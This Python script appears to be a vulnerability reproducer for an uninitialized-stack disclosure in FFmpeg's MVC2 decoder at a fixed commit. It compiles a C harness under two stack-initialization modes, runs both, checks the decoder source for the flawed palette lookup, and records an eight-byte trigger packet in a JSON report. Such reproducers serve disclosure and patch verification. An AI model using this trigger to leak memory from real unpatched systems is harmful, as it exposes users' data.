"""Prove MVC2 palette-indexed uninitialized-stack disclosure."""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import platform
import subprocess
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

SCHEMA_VERSION = "cw.ffmpeg.mvc2-palette-disclosure-reproducer.v1"
VULNERABLE_COMMIT = "795bccdaf57772b1803914dee2f32d52776518e2"


def _arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("--checkout", type=Path, required=True)
    parser.add_argument(
        "--harness",
        type=Path,
        default=Path(__file__).with_name(
            "ffmpeg_mvc2_palette_disclosure_reproducer.c"
        ),
    )
    parser.add_argument("--pattern-binary-output", type=Path, required=True)
    parser.add_argument("--zero-binary-output", type=Path, required=True)
    parser.add_argument("--output", type=Path, required=True)
    return parser.parse_args()


def _sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for block in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(block)
    return digest.hexdigest()


def _head(path: Path) -> str:
    result = subprocess.run(
        ["git", "rev-parse", "HEAD"],
        cwd=path,
        check=False,
        capture_output=True,
        text=True,
    )
    return result.stdout.strip()


def _compile_command(
    checkout: Path,
    harness: Path,
    binary: Path,
    initialization: str,
) -> list[str]:
    command = [
        "clang",
        "-I.",
        "-D_ISOC11_SOURCE",
        "-D_FILE_OFFSET_BITS=64",
        "-D_LARGEFILE_SOURCE",
        "-I./compat/dispatch_semaphore",
        "-DPIC",
        "-I./compat/stdbit",
        "-DHAVE_AV_CONFIG_H",
        f"-ftrivial-auto-var-init={initialization}",
        "-fsanitize=address",
        "-fno-omit-frame-pointer",
        "-ffunction-sections",
        "-g",
        "-O1",
        "-std=c17",
        "-fPIC",
        "-pthread",
    ]
    if platform.system() == "Darwin":
        command.append("-Wl,-dead_strip")
    else:
        command.append("-Wl,--gc-sections")
    command.extend(
        [
            "-o",
            str(binary),
            str(harness),
            str(checkout / "libavcodec/mvcdec.c"),
            "libavcodec/libavcodec.a",
            "libavutil/libavutil.a",
            "-lm",
            "-lz",
        ]
    )
    if platform.system() == "Darwin":
        command.extend(
            [
                "-framework",
                "CoreFoundation",
                "-framework",
                "Security",
                "-liconv",
                "-framework",
                "AudioToolbox",
                "-framework",
                "VideoToolbox",
                "-framework",
                "CoreMedia",
                "-framework",
                "CoreVideo",
                "-framework",
                "CoreServices",
            ]
        )
    command.append("-pthread")
    return command


def _compile_and_run(
    checkout: Path,
    harness: Path,
    binary: Path,
    initialization: str,
) -> dict[str, Any]:
    command = _compile_command(checkout, harness, binary, initialization)
    compile_result = subprocess.run(
        command,
        cwd=checkout,
        check=False,
        capture_output=True,
        text=True,
    )
    environment: dict[str, str] | None = None
    if compile_result.returncode == 0:
        environment = os.environ.copy()
        environment["ASAN_OPTIONS"] = (
            "halt_on_error=1:abort_on_error=1:detect_leaks=0"
        )
        run_result = subprocess.run(
            [str(binary)],
            cwd=checkout,
            env=environment,
            check=False,
            capture_output=True,
            text=True,
        )
    else:
        run_result = subprocess.CompletedProcess(
            [str(binary)], 127, "", "compile failed"
        )
    return {
        "initialization": initialization,
        "binary": str(binary),
        "binary_sha256": _sha256(binary) if binary.is_file() else None,
        "compile_command": command,
        "compile_returncode": compile_result.returncode,
        "compile_stdout": compile_result.stdout,
        "compile_stderr": compile_result.stderr,
        "asan_options": environment["ASAN_OPTIONS"] if environment else None,
        "run_command": [str(binary)],
        "returncode": run_result.returncode,
        "stdout": run_result.stdout,
        "stderr": run_result.stderr,
    }


def main() -> None:
    args = _arguments()
    checkout = args.checkout.expanduser().resolve()
    harness = args.harness.expanduser().resolve()
    pattern_binary = args.pattern_binary_output.expanduser().resolve()
    zero_binary = args.zero_binary_output.expanduser().resolve()
    output = args.output.expanduser().resolve()
    source = checkout / "libavcodec/mvcdec.c"
    components = checkout / "config_components.h"
    required = (
        harness,
        source,
        components,
        checkout / "libavcodec/libavcodec.a",
        checkout / "libavutil/libavutil.a",
    )
    if _head(checkout) != VULNERABLE_COMMIT or not all(
        path.is_file() for path in required
    ):
        raise ValueError(
            f"configured FFmpeg build must exist at {VULNERABLE_COMMIT}"
        )

    source_text = source.read_text(encoding="utf-8", errors="replace")
    component_text = components.read_text(encoding="utf-8", errors="replace")
    if "#define CONFIG_MVC2_DECODER 1" not in component_text:
        raise ValueError("configured build must enable the MVC2 decoder")

    pattern_binary.parent.mkdir(parents=True, exist_ok=True)
    zero_binary.parent.mkdir(parents=True, exist_ok=True)
    output.parent.mkdir(parents=True, exist_ok=True)
    pattern = _compile_and_run(
        checkout, harness, pattern_binary, "pattern"
    )
    zero = _compile_and_run(checkout, harness, zero_binary, "zero")

    source_indicators = {
        "palette_is_uninitialized_stack_storage": (
            "uint32_t color[128], v[8];" in source_text
        ),
        "attacker_controls_palette_count": (
            "nb_colors = bytestream2_get_byteu(gb);" in source_text
        ),
        "only_declared_palette_entries_are_initialized": (
            "for (i = 0; i < FFMIN(nb_colors, 128); i++)" in source_text
        ),
        "seven_bit_packet_index_reads_palette": (
            "color[p0 & 0x7F]" in source_text
        ),
        "index_is_not_checked_against_palette_count": (
            "(p0 & 0x7F) >= nb_colors" not in source_text
            and "(p0 & 0x7F) < nb_colors" not in source_text
        ),
    }
    runtime_indicators = {
        "pattern_build_succeeded": pattern["returncode"] == 0,
        "zero_build_succeeded": zero["returncode"] == 0,
        "pattern_stack_bytes_became_pixel": (
            "pixel=aaaaaaaa format=28 size=4x4" in pattern["stdout"]
        ),
        "zero_stack_bytes_became_pixel": (
            "pixel=00000000 format=28 size=4x4" in zero["stdout"]
        ),
        "sanitizer_clean": "Sanitizer" not in (
            pattern["stdout"]
            + pattern["stderr"]
            + zero["stdout"]
            + zero["stderr"]
        ),
    }
    expected_observed = all(source_indicators.values()) and all(
        runtime_indicators.values()
    )
    payload = {
        "schema_version": SCHEMA_VERSION,
        "completed_at": datetime.now(UTC).isoformat(),
        "checkout": str(checkout),
        "checkout_commit": _head(checkout),
        "harness": str(harness),
        "harness_sha256": _sha256(harness),
        "source": str(source),
        "source_sha256": _sha256(source),
        "payload_hex": "0004000400000080",
        "pattern_run": pattern,
        "zero_run": zero,
        "source_indicators": source_indicators,
        "runtime_indicators": runtime_indicators,
        "expected_observed": expected_observed,
        "scope": (
            "An eight-byte packet sent through the public MVC2 decoder declares "
            "zero palette entries and then selects palette index zero. The "
            "decoder copies four uninitialized stack bytes into every pixel of "
            "the returned 4x4 RGB32 frame. Compiling the vulnerable decoder "
            "source as the public registry symbol under deterministic pattern "
            "and zero stack initialization proves the data-flow differential."
        ),
    }
    temporary = output.with_suffix(output.suffix + ".tmp")
    temporary.write_text(
        json.dumps(payload, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )
    temporary.replace(output)
    print(output)
    if not expected_observed:
        raise SystemExit(1)


if __name__ == "__main__":
    main()
